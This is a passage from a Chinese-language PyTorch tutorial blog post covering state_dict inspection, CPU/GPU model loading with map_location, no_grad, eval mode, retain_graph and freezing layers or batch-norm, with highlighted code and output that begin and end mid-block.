self.pool(F.relu(self.conv2(x)))</span><br><span class="line">x = x.view(-<span class="number">1</span>, <span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>)</span><br><span class="line">x = F.relu(self.fc1(x))</span><br><span class="line">x = F.relu(self.fc2(x))</span><br><span class="line">x = self.fc3(x)</span><br><span class="line"><span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize model</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#初始化模型，但是没有传入数据，无所谓，因为模型的参数原来就不依附数据</span></span><br><span class="line">model = TheModelClass()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize optimizer</span></span><br><span class="line">optimizer = optim.SGD(model.parameters(), lr=<span class="number">0.001</span>, momentum=<span class="number">0.9</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Model&#x27;s state_dict:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> param_tensor <span class="keyword">in</span> model.state_dict():</span><br><span class="line"><span class="built_in">print</span>(param_tensor, <span class="string">&quot;\t&quot;</span>, model.state_dict()[param_tensor].size())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Optimizer&#x27;s state_dict:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> var_name <span class="keyword">in</span> optimizer.state_dict():</span><br><span class="line"><span class="built_in">print</span>(var_name, <span class="string">&quot;\t&quot;</span>, optimizer.state_dict()[var_name])</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Model<span class="string">&#x27;s state_dict:</span></span><br><span class="line"><span class="string">conv1.weight            torch.Size([8, 3, 5, 5])</span></span><br><span class="line"><span class="string">conv1.bias              torch.Size([8])</span></span><br><span class="line"><span class="string">bn.weight               torch.Size([8])</span></span><br><span class="line"><span class="string">bn.bias                 torch.Size([8])</span></span><br><span class="line"><span class="string">bn.running_mean         torch.Size([8])</span></span><br><span class="line"><span class="string">bn.running_var          torch.Size([8])</span></span><br><span class="line"><span class="string">bn.num_batches_tracked  torch.Size([])</span></span><br><span class="line"><span class="string">conv2.weight            torch.Size([16, 8, 5, 5])</span></span><br><span class="line"><span class="string">conv2.bias              torch.Size([16])</span></span><br><span class="line"><span class="string">fc1.weight              torch.Size([120, 400])</span></span><br><span class="line"><span class="string">fc1.bias                torch.Size([120])</span></span><br><span class="line"><span class="string">fc2.weight              torch.Size([10, 120])</span></span><br><span class="line"><span class="string">fc2.bias                torch.Size([10])</span></span><br><span class="line"><span class="string">Optimizer&#x27;</span>s state_dict:</span><br><span class="line">state            &#123;&#125;</span><br><span class="line">param_groups     [&#123;<span class="string">&#x27;lr&#x27;</span>: <span class="number">0.001</span>, <span class="string">&#x27;momentum&#x27;</span>: <span class="number">0.9</span>, <span class="string">&#x27;dampening&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;weight_decay&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;nesterov&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;params&#x27;</span>: [<span class="number">139805696932024</span>, <span class="number">139805483616008</span>, <span class="number">139805483616080</span>, <span class="number">139805483616152</span>, <span class="number">139805483616440</span>, <span class="number">139805483616512</span>, <span class="number">139805483616584</span>, <span class="number">139805483616656</span>, <span class="number">139805483616728</span>, <span class="number">139805483616800</span>]&#125;]</span><br></pre></td></tr></table></figure><blockquote><p>可以看到 model.state_dict() 保存了卷积层，BatchNorm层和最大池化层的信息；而 optimizer.state_dict() 则保存的优化器的状态和相关的超参数。</p></blockquote><h3 id="跨设备保存加载模型"><a href="#跨设备保存加载模型" class="headerlink" title="跨设备保存加载模型"></a>跨设备保存加载模型</h3><h4 id="Save-on-GPU-Load-on-CPU"><a href="#Save-on-GPU-Load-on-CPU" class="headerlink" title="Save on GPU, Load on CPU"></a>Save on GPU, Load on CPU</h4><p>在 CPU 上加载在 GPU 上训练并保存的模型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">device = torch.device(<span class="string">&#x27;cpu&#x27;</span>)</span><br><span class="line">model = TheModelClass()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load all tensors onto the CPU device</span></span><br><span class="line">model.load_state_dict(torch.load(<span class="string">&#x27;net_params.pkl&#x27;</span>, map_location=device))</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">model.load_state_dict(torch.load(<span class="string">&#x27;net_params.pkl&#x27;</span>, map_location=<span class="string">&#x27;cpu&#x27;</span>))</span><br></pre></td></tr></table></figure><p><strong>map_location：</strong>一个公式、torch.device、字符串或者一个字典，用来明确如何去重新映射存储位置。<br>官方示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>torch.load(<span class="string">&#x27;tensors.pt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load all tensors onto the CPU</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>torch.load(<span class="string">&#x27;tensors.pt&#x27;</span>, map_location=torch.device(<span class="string">&#x27;cpu&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load all tensors onto the CPU, using a function</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>torch.load(<span class="string">&#x27;tensors.pt&#x27;</span>, map_location=<span class="keyword">lambda</span> storage, loc: storage)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load all tensors onto GPU 1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>torch.load(<span class="string">&#x27;tensors.pt&#x27;</span>, map_location=<span class="keyword">lambda</span> storage, loc: storage.cuda(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Map tensors from GPU 1 to GPU 0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>torch.load(<span class="string">&#x27;tensors.pt&#x27;</span>, map_location=&#123;<span class="string">&#x27;cuda:1&#x27;</span>:<span class="string">&#x27;cuda:0&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>不需要将模型迁移到device上，因为一开始载入都是载入到内存先的，所以不需要迁移操作。</p></blockquote><h4 id="Save-on-GPU-Load-on-GPU"><a href="#Save-on-GPU-Load-on-GPU" class="headerlink" title="Save on GPU, Load on GPU"></a>Save on GPU, Load on GPU</h4><p>在 GPU 上加载在 GPU 上训练并保存的模型:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">device = torch.device(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line">model = TheModelClass()</span><br><span class="line">model.load_state_dict(torch.load(<span class="string">&#x27;net_params.pkl&#x27;</span>))</span><br><span class="line">model.to(device)</span><br></pre></td></tr></table></figure><blockquote><p>需要将模型和数据都迁移到显存上，才能开始训练。</p></blockquote><p>在这里使用 map_location 参数不起作用，要使用 <strong><a href="http://model.to/">model.to</a>(torch.device(“cuda”))</strong> 将模型转换为CUDA优化的模型。<br>还需要对将要输入模型的数据调用 **data &#x3D; <a href="http://data.to/">data.to</a>(device)**，即将数据从CPU转移到GPU。请注意，调用 my_tensor.to(device) 会返回一个 my_tensor 在 GPU 上的副本，它不会覆盖 my_tensor。因此需要手动覆盖张量：my_tensor &#x3D; my_tensor.to(device)。</p><h4 id="Save-on-CPU-Load-on-GPU"><a href="#Save-on-CPU-Load-on-GPU" class="headerlink" title="Save on CPU, Load on GPU"></a>Save on CPU, Load on GPU</h4><p>在 GPU 上加载在 CPU 上训练并保存的模型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">device = torch.device(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line">model = TheModelClass()</span><br><span class="line">model.load_state_dict(torch.load(<span class="string">&#x27;net_params.pkl&#x27;</span>, map_location=<span class="string">&quot;cuda:0&quot;</span>))</span><br><span class="line">model.to(device)</span><br><span class="line"></span><br><span class="line"><span class="comment">#方法二</span></span><br><span class="line">device = torch.device(<span class="string">&quot;cuda：0&quot;</span>)</span><br><span class="line">model = TheModelClass()</span><br><span class="line">model.load_state_dict(torch.load(<span class="string">&#x27;net_params.pkl&#x27;</span>))</span><br><span class="line">model.to(device)</span><br></pre></td></tr></table></figure><p>当加载<strong>单个</strong>包含GPU tensors的模型的设备时，这些tensors 会被默认加载到GPU上，不过是同一个GPU设备。<br>当有<strong>多个GPU设备</strong>时，可以通过将 map_location 设定为 cuda:device_id 来指定使用哪一个GPU设备，上面例子是指定编号为0的GPU设备。</p><h3 id="CUDA"><a href="#CUDA" class="headerlink" title="CUDA"></a>CUDA</h3><h4 id="判断cuda是否可用"><a href="#判断cuda是否可用" class="headerlink" title="判断cuda是否可用"></a>判断cuda是否可用</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(torch.cuda.is_available())</span><br></pre></td></tr></table></figure><h4 id="获取gpu数量"><a href="#获取gpu数量" class="headerlink" title="获取gpu数量"></a>获取gpu数量</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(torch.cuda.device_count())</span><br></pre></td></tr></table></figure><h4 id="获取gpu名字"><a href="#获取gpu名字" class="headerlink" title="获取gpu名字"></a>获取gpu名字</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torch.cuda.get_device_name(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h4 id="返回当前gpu设备索引，默认从0开始"><a href="#返回当前gpu设备索引，默认从0开始" class="headerlink" title="返回当前gpu设备索引，默认从0开始"></a>返回当前gpu设备索引，默认从0开始</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torch.cuda.current_device()</span><br></pre></td></tr></table></figure><h4 id="查看tensor或者model在哪块GPU上"><a href="#查看tensor或者model在哪块GPU上" class="headerlink" title="查看tensor或者model在哪块GPU上"></a>查看tensor或者model在哪块GPU上</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torch.tensor([<span class="number">0</span>]).get_device()</span><br></pre></td></tr></table></figure><h4 id="将数据和模型从cpu迁移到gpu上"><a href="#将数据和模型从cpu迁移到gpu上" class="headerlink" title="将数据和模型从cpu迁移到gpu上"></a>将数据和模型从cpu迁移到gpu上</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">use_cuda = torch.cuda.is_available()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法一：</span></span><br><span class="line"><span class="keyword">if</span> use_cuda:</span><br><span class="line">data = data.cuda()</span><br><span class="line">model.cuda()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法二：</span></span><br><span class="line">device = torch.device(<span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> use_cuda <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#或</span></span><br><span class="line">device = torch.device(<span class="string">&quot;cuda:0&quot;</span> <span class="keyword">if</span> use_cuda <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span>)</span><br><span class="line">data = data.to(device)</span><br><span class="line">model.to(device)</span><br></pre></td></tr></table></figure><h2 id="no-grad"><a href="#no-grad" class="headerlink" title="no_grad"></a>no_grad</h2><p>一般来说，我们在进行模型训练的过程中，因为要监控模型的性能，在跑完若干个epoch训练之后，需要进行一次在验证集[4]上的性能验证。一般来说，在验证或者是测试阶段，因为只是需要跑个前向传播(forward)就足够了，<strong>因此不需要保存变量的梯度</strong>。<br><strong>问题：</strong>保存梯度是需要额外显存或者内存进行保存的，占用了空间，有时候还会在验证阶段导致OOM(Out Of Memory)错误，因此我们在验证和测试阶段，最好显式地取消掉模型变量的梯度。通过no_grad实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">model.train()</span><br><span class="line"></span><br><span class="line"><span class="comment"># here train the model, just skip the codes</span></span><br><span class="line">model.<span class="built_in">eval</span>() <span class="comment"># here we start to evaluate the model</span></span><br><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> eval_data:</span><br><span class="line">data, label = each</span><br><span class="line">logit = model(data)</span><br><span class="line"><span class="meta">... </span><span class="comment"># here we just skip the codes</span></span><br></pre></td></tr></table></figure><p>在pytorch0.4之前的版本通过volatile&#x3D;True来进行设置。</p><h2 id="model-eval"><a href="#model-eval" class="headerlink" title="model.eval"></a>model.eval</h2><blockquote><p>在模型中有BN层或者dropout层时，在训练阶段和测试阶段必须显式指定train()和eval()。</p></blockquote><p>我们的模型中经常会有一些子模型，其在<strong>训练时候和测试时候的参数是不同的</strong>，比如dropout[6]中的丢弃率和Batch Normalization[5]中的$\gamma$和$\beta$等，这个时候我们就需要显式地指定不同的阶段（训练或者测试），在pytorch中我们通过model.train()和model.eval()进行显式指定，具体如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">model = CNNNet(params)</span><br><span class="line"></span><br><span class="line"><span class="comment"># here we start the training</span></span><br><span class="line">model.train()</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> train_data:</span><br><span class="line">data, label = each</span><br><span class="line">logit = model(data)</span><br><span class="line">loss = criterion(logit, label)</span><br><span class="line"><span class="meta">... </span><span class="comment"># just skip</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># here we start the evaluation</span></span><br><span class="line">model.<span class="built_in">eval</span>() </span><br><span class="line"><span class="keyword">with</span> torch.no_grad(): <span class="comment"># we dont need grad in eval phase</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> eval_data:</span><br><span class="line">data, label = each</span><br><span class="line">logit = model(data)</span><br><span class="line">loss = criterion(logit, label)</span><br><span class="line"><span class="meta">... </span><span class="comment"># just skip</span></span><br></pre></td></tr></table></figure><blockquote><p>从这里看model.train()和model.eval()函数并不执行模型，只是对其中的BN和Dropout进行设置。</p></blockquote><h2 id="retain-graph"><a href="#retain-graph" class="headerlink" title="retain_graph"></a>retain_graph</h2><p>在对一个损失进行反向传播时，在pytorch中调用out.backward()即可实现:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">net</span>(nn.Module):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="built_in">super</span>().__init__()</span><br><span class="line">self.fc1 = nn.Linear(<span class="number">10</span>,<span class="number">2</span>)</span><br><span class="line">self.act = nn.ReLU()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self,inputv</span>):</span><br><span class="line"><span class="keyword">return</span> self.act(self.fc1(inputv))</span><br><span class="line">n = net()</span><br><span class="line">opt = torch.optim.Adam(n.parameters(),lr=<span class="number">3e-4</span>)</span><br><span class="line">inputv = torch.tensor(np.random.normal(size=(<span class="number">4</span>,<span class="number">10</span>))).<span class="built_in">float</span>()</span><br><span class="line">output = n(inputv)</span><br><span class="line">target = torch.tensor(np.ones((<span class="number">4</span>,<span class="number">2</span>))).<span class="built_in">float</span>()</span><br><span class="line">loss = nn.functional.mse_loss(output, target)</span><br><span class="line">loss.backward() <span class="comment"># here we calculate the gradient w.r.t the leaf</span></span><br></pre></td></tr></table></figure><blockquote><p>w.r.t按这里的翻译就是叶子的梯度。</p></blockquote><p>对loss进行反向传播就可以获得$\partial loss&#x2F;\partial w_{i,j}$,即是损失对于每个叶子节点的梯度。在.backward这个API文档中，有多个参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backward(gradient=<span class="literal">None</span>, retain_graph=<span class="literal">None</span>, create_graph=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>这里我们关注的是retain_graph这个参数，这个参数如果为<strong>False或者None</strong>则在反向传播完后，就<strong>释放掉构建出来的graph</strong>，如果为<strong>True则不对graph进行释放</strong>。</p><h3 id="为什么不释放"><a href="#为什么不释放" class="headerlink" title="为什么不释放"></a>为什么不释放</h3><blockquote><p>存在多个loss的时候，很有用。</p></blockquote><h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><p>首先构造graph：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch.autograd <span class="keyword">import</span> Variable</span><br><span class="line">a = Variable(torch.rand(<span class="number">1</span>, <span class="number">4</span>), requires_grad=<span class="literal">True</span>)</span><br><span class="line">b = a**<span class="number">2</span></span><br><span class="line">c = b*<span class="number">2</span></span><br><span class="line">d = c.mean()</span><br><span class="line">e = c.<span class="built_in">sum</span>()</span><br></pre></td></tr></table></figure><p>如图：<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650001096236_0.png" alt="image.png"><br>当我们第一次使用$d.backward()$对末节点d进行求梯度，这样在执行完反向传播之后，因为没有显式地要求它保留graph，系统对graph内存进行释放，<strong>如果下一步需要对节点e进行求梯度，那么将会因为没有这个graph而报错</strong>。因此有例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d.backward(retain_graph=<span class="literal">True</span>) <span class="comment"># fine</span></span><br><span class="line">e.backward(retain_graph=<span class="literal">True</span>) <span class="comment"># fine</span></span><br><span class="line">d.backward() <span class="comment"># also fine</span></span><br><span class="line">e.backward() <span class="comment"># error will occur!</span></span><br></pre></td></tr></table></figure><p>利用这个性质在某些场景是有作用的，比如在<strong>对抗生成网络GAN</strong>中需要先对某个模块比如生成器进行训练，后对判别器进行训练，这个时候整个网络就会存在<strong>两个以上的loss</strong>，例子如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">G_loss = ...</span><br><span class="line">D_loss = ...</span><br><span class="line">opt.zero_grad() <span class="comment"># 对所有梯度清0</span></span><br><span class="line">D_loss.backward(retain_graph=<span class="literal">True</span>) <span class="comment"># 保存graph结构，后续还要用</span></span><br><span class="line">opt.step() <span class="comment"># 更新梯度，只更新D的，因为只有D的不为0</span></span><br><span class="line">opt.zero_grad() <span class="comment"># 对所有梯度清0</span></span><br><span class="line">G_loss.backward(retain_graph=<span class="literal">False</span>) <span class="comment"># 不保存graph结构了，可以释放graph，</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下一个迭代中通过forward还可以build出来的</span></span><br><span class="line">opt.step() <span class="comment"># 更新梯度，只更新G的，因为只有G的不为0</span></span><br></pre></td></tr></table></figure><p>这个时候就可以对网络中多个loss进行分步的训练了。</p><h2 id="冻结网络层"><a href="#冻结网络层" class="headerlink" title="冻结网络层"></a>冻结网络层</h2><blockquote><p>freeze</p></blockquote><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>会固定网络中的BN、dropout等在训练和测试的时候行为不一致的模块。</p><h3 id="冻结指定的层"><a href="#冻结指定的层" class="headerlink" title="冻结指定的层"></a>冻结指定的层</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#需要先对指定的层设置grad_fn=false</span></span><br><span class="line"><span class="keyword">for</span> param <span class="keyword">in</span> model.named_parameters():</span><br><span class="line"><span class="keyword">if</span> param[<span class="number">0</span>] <span class="keyword">in</span> need_frozen_list:</span><br><span class="line">param[<span class="number">1</span>].requires_grad = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这种方法需要注意的是层名一定要和model中一致，model经过.cuda后往往所用层会添加module.的前缀，会导致后面的冻结无效。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后需要改正optimizer</span></span><br><span class="line">optimizer = torch.optim.SGD(<span class="built_in">filter</span>(<span class="keyword">lambda</span> p: p.requires_grad, model.parameters()), lr=args.lr,momentum=args.momentum, weight_decay=args.weight_decay)</span><br></pre></td></tr></table></figure><h3 id="named-parameters实现"><a href="#named-parameters实现" class="headerlink" title="named_parameters实现"></a>named_parameters实现</h3><p>可以通过named_parameters来找到指定的层进行固定</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">net = Net()</span><br><span class="line"></span><br><span class="line"><span class="comment"># named_parameters以键值的形式存储</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> net.named_parameters():</span><br><span class="line"><span class="keyword">if</span> m[<span class="number">0</span>].find(<span class="string">&#x27;CenterNessNet&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">m[<span class="number">1</span>].requires_grad = <span class="literal">True</span> <span class="comment">#只要CenterNetssNet部分的值进行训练</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">m[<span class="number">1</span>].requries_grad = <span class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="只冻结BN"><a href="#只冻结BN" class="headerlink" title="只冻结BN"></a>只冻结BN</h3><h4 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h4><p>由于bn城的参数不光与其待训练的参数有关，还与runing_mean和runing_var两个参数有关，而这2个参数是通过统计得到的，如果直接使用常规的冻结操作：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> self.<span class="property">detection_net</span>:</span><br><span class="line"><span class="keyword">for</span> param <span class="keyword">in</span> p.<span class="title function_">parameters</span>():</span><br><span class="line">param.<span class="property">requires_grad</span> = <span class="title class_">False</span></span><br></pre></td></tr></table></figure><blockquote><p>是无法有效冻结bn操作的</p></blockquote><h4 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h4><p>这里通过apply函数和class属性来实现</p><h5 id="class属性"><a href="#class属性" class="headerlink" title="class属性"></a><strong>class属性</strong></h5><p>可以使用模型的class属性中的name变量来查看当前层的类型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">l = [conv,bn]</span><br><span class="line">basename = l.__class__.__name__</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> basename:</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># conv</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bn</span></span><br></pre></td></tr></table></figure><p>⚠️ 问题通过以上方式是无法便利出Sequential封装的，所以这个时候就需要使用apply</p><h5 id="apply"><a href="#apply" class="headerlink" title="apply"></a>apply</h5><p>为当前的元组（或list）的每个元素应用所指定的函数。</p><h5 id="最终实现"><a href="#最终实现" class="headerlink" title="最终实现"></a>最终实现</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fix_bn</span>(<span class="params">m</span>):</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个操作只能获得名称，所以不适合考虑前缀的操作，只能找BN用</span></span><br><span class="line">classname = m.__class__.__name__</span><br><span class="line"><span class="keyword">if</span> classname.find(<span class="string">&#x27;BatchNorm&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">m.<span class="built_in">eval</span>()</span><br><span class="line">model = models.resnet50(pretrained=<span class="literal">True</span>)</span><br><span class="line">model.cuda()</span><br><span class="line">model.train()</span><br><span class="line">model.apply(fix_bn) <span class="comment"># fix batchnorm</span></span><br></pre></td></tr></table></figure><p>通过以上方式就可以很好的固定BN操作了。</p><h4 id="实现二"><a href="#实现二" class="headerlink" title="实现二"></a>实现二</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">fix_bn</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="function">for layer in self.modules():</span></span><br><span class="line"><span class="function">if isinstanace(layer, nn.BatchNorm2d):</span></span><br><span class="line"><span class="function">layer.eval()</span></span><br></pre></td></tr></table></figure><h1 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h1><p>Pytorch的数据读取主要由3个类完成：Dataset、Samper、DataLoader。Dataset用来读取单张样本、Samper对数据集中的样本进行采样、DataLoader根据采样顺序读取一个Batch的数据。为了更加直观，这里反向解释。</p><h2 id="dataloader"><a href="#dataloader" class="headerlink" title="dataloader"></a>dataloader</h2><blockquote><p>pytorch&#x2F;torch&#x2F;utils&#x2F;data&#x2F;dataloader.py</p></blockquote><p>调用了sampler函数进行采样工作<br>定义了由多少个进程(线程)来处理数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DataLoader</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line"><span class="comment"># sampler：生成一系列的index</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 